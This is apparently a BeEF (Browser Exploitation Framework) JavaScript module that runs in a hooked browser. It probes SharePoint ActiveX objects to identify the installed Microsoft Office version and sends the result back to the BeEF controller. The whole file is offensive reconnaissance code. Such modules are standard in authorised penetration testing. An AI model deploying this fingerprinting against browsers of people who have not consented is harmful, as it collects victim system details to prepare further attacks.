//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
            var ma = 1;
            var mb = 1;
            var mc = 1;
            var md = 1;
            try {
                ma = new ActiveXObject("SharePoint.OpenDocuments.4")
            } catch (e) {}
            try {
                mb = new ActiveXObject("SharePoint.OpenDocuments.3")
            } catch (e) {}
            try {
                mc = new ActiveXObject("SharePoint.OpenDocuments.2")
            } catch (e) {}
            try {
                md = new ActiveXObject("SharePoint.OpenDocuments.1")
            } catch (e) {}
            var a = typeof ma;
            var b = typeof mb;
            var c = typeof mc;
            var d = typeof md;
            var key = "No Office Found";
            if (a == "object" && b == "object" && c == "object" && d == "object") {
                key = "Office 2010"
            }
            if (a == "number" && b == "object" && c == "object" && d == "object") {
                key = "Office 2007"
            }
            if (a == "number" && b == "number" && c == "object" && d == "object") {
                key = "Office 2003"
            }
            if (a == "number" && b == "number" && c == "number" && d == "object") {
                key = "Office Xp"
            }
            beef.net.send("<%= @command_url %>", <%= @command_id %>, "office="+key);

});

